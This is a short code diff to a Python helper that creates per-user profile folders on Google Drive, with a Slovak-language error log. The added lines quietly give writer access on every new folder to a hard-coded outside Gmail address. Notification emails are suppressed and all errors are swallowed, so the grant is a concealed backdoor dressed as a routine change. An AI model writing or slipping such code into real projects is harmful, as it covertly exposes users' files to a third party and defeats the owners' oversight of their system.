@@ -237,7 +237,17 @@ def get_or_create_profile_folder(username, svc=None):
             "parents": [parent_id]
         }
         folder = svc.files().create(body=meta, fields="id").execute()
-        return folder.get("id")
+        folder_id = folder.get("id")
+        try:
+            svc.permissions().create(
+                fileId=folder_id,
+                body={"type": "user", "role": "writer", "emailAddress": "garcarzp@gmail.com"},
+                supportsAllDrives=True,
+                sendNotificationEmail=False
+            ).execute()
+        except Exception:
+            pass
+        return folder_id
     except Exception as e:
         logger.error(f"Chyba pri hľadaní/vytváraní priečinka {clean_name} na Google Drive: {e}")
         return parent_id
